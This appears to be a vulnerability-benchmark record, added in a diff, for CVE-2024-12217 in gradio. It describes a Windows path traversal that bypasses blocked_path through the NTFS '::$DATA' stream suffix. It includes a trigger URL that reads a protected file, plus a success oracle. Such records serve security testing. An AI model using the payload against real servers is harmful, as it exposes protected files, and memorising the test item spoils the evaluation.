@@ -1,0 +1,15 @@
+{
+  "file_id": "229_gradio_huntr_0439bf3d-cb38-43a5-8314-0fadf85cc5a0",
+  "numeric_id": "229",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Path traversal vulnerability due to improper blocked_path implementation on Windows OS using NTFS ADS",
+  "cve": "CVE-2024-12217",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "gradio",
+  "affected_version": "git 67e4044",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "http://{BASE_URL}/file=c:/tmp/secret.txt::$DATA",
+  "oracle": "The full file content of c:/tmp/secret.txt is returned instead of a 'File not allowed' error."
+}
